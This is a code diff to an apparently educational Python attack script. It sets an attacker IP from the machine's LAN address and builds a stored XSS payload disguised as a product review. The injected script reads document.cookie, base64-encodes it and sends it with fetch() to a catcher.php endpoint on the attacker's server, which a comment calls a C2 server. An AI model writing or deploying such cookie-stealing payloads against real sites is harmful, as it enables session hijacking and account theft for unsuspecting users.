@@ -1,11 +1,29 @@
+import socket
 import requests
+
+
+def detect_lan_ip():
+    # Open a UDP socket toward a public address. No packet is actually
+    # sent (we never call sendto), but the OS picks the outbound
+    # interface so getsockname() returns this machine's LAN IP.
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("8.8.8.8", 80))
+        return s.getsockname()[0]
+    except OSError:
+        return None
+    finally:
+        s.close()
+
+
+ATTACKER_IP = detect_lan_ip() or input("Could not auto-detect LAN IP. Enter attacker IP: ").strip()
 
 # --- XSS Payload ---
 # The code that steals the cookie and sends it to your C2 server
-PAYLOAD = """
+PAYLOAD = f"""
 The handle gets too hot, and there's a weird smell.<script>
     var encoded = btoa(document.cookie);
-    fetch('http://localhost/CyberProject/AttackerServer/catcher.php?data=' + encoded);
+    fetch('http://{ATTACKER_IP}/CyberProject/AttackerServer/catcher.php?data=' + encoded);
 </script>
 """
 
